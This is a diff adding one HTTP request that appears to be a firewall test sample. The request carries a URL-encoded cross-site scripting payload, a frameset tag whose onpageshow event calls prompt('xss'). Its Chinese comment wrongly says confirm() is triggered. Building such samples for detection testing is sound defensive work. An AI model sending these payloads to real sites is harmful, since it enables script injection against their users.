@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_frameset标签_onpageshow事件-06506585
+# 攻击载荷利用了HTML中的frameset标签和onpageshow属性，触发confirm()函数，显示一个提示框。页面显示时触发，使用单引号绕过
+GET /?id=%3Cframeset%20onpageshow=prompt%28%27xss%27%29%3E&bid=hd_tag_m8mv267i HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv267i
+RM-PRO-Token: b7fae86d14427617b1fca4921100f11b
+RM-PRO-Time: 1742808551857
+User-Agent: curl/7.83.1
+
